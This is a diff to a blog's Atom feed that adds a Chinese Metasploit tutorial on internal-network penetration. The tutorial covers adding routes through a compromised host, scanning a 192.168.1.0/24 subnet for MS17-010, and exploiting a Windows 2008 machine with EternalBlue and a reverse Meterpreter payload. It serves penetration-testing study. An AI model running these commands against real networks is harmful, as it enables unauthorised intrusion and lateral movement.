@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://hamal.cc/"/>
-  <updated>2018-09-22T06:25:08.374Z</updated>
+  <updated>2018-09-25T14:43:41.790Z</updated>
   <id>http://hamal.cc/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>msf内网渗透（一）</title>
+    <link href="http://hamal.cc/2018/09/msf%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/"/>
+    <id>http://hamal.cc/2018/09/msf内网渗透（一）/</id>
+    <published>2018-09-25T13:46:34.000Z</published>
+    <updated>2018-09-25T14:43:41.790Z</updated>
+    
+    <content type="html"><![CDATA[<p>当我们拿到一个shell就想看看内网有多少机器，有兴趣的就进行内网渗透，<strong><a id="more"></a></strong>这次我发现内网机子存在ms17_010漏洞，进行meterpreter内网渗透。</p><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>拿到内网的一个shell。<br><img src="/images/19.1.png" alt=""><br>我探查过是存在内网的，如果要内网扫描是要先添加路由的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets   //看内网路由</span><br><span class="line">run autoroute -s 192.168.1.0/24     //添加路由</span><br><span class="line">run autoroute -p     //看添加的路由</span><br></pre></td></tr></table></figure></p><p><img src="/images/19.2.png" alt=""><br>调用扫描模块进行网络主机漏洞扫描。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">background    //退到后台</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010     //调用扫描模块</span><br><span class="line">set rhosts 192.168.1.0/24     //全部内网机器</span><br><span class="line">set threads 20     //扫描线程</span><br></pre></td></tr></table></figure></p><p><img src="/images/19.3.png" alt=""><br>发现有一台内网机器存在445漏洞，是Windows2008、64位。<br><img src="/images/19.4.png" alt=""></p><h3 id="内网攻击"><a href="#内网攻击" class="headerlink" title="内网攻击"></a>内网攻击</h3><p>调用攻击模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue    //攻击模块</span><br><span class="line">show options    //看攻击模块选项</span><br><span class="line">set rhost 192.168.1.104     //设置存在漏洞的主机</span><br></pre></td></tr></table></figure></p><p><img src="/images/19.5.png" alt=""><br>不知道为什么这次用<code>generic/shell_reverse_tcp</code>Payload攻击失败了，换了Payload才成功。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show payloads   //查看可用Payload</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp     //设置Payload</span><br></pre></td></tr></table></figure></p><p><img src="/images/19.7.png" alt=""><br>成功获取到内网shell。<br><img src="/images/19.6.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;当我们拿到一个shell就想看看内网有多少机器，有兴趣的就进行内网渗透，&lt;strong&gt;
+    
+    </summary>
+    
+      <category term="内网渗透" scheme="http://hamal.cc/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="内网渗透" scheme="http://hamal.cc/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>木马免杀免杀</title>
